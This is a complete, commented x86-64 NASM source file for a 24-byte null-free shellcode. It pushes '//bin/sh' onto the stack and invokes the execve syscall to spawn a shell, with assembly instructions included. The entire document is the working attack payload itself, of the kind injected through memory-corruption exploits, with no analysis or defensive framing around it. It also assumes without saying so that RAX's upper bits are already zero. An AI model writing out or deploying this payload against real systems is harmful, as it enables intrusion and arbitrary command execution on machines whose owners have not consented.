; 24-byte null-free execve("/bin/sh", NULL, NULL) shellcode
; NASM: nasm -f bin -o shellcode.bin shellcode.asm

BITS 64

xor rsi, rsi                    ; rsi = 0 (argv = NULL)
push rsi                        ; null terminator for "/bin/sh"
mov rdi, 0x68732f2f6e69622f    ; "//bin/sh" (double slash to pad to 8 bytes, no nulls)
push rdi                        ; string on stack
push rsp
pop rdi                         ; rdi = pointer to "/bin/sh"
xor rdx, rdx                    ; rdx = 0 (envp = NULL)
mov al, 59                      ; execve syscall number
syscall
